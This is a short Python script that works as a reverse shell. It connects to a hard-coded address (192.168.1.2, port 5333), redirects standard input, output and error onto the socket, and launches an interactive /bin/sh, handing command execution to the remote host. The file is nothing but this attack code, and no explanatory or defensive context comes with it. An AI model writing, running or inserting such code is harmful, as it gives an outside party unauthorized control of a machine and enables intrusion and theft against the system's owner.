import socket
import subprocess
import os
import time

IP = '192.168.1.2'
PORT = 5333

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])

print("Reverse Shell running...")

time.sleep(10)
exit(0)
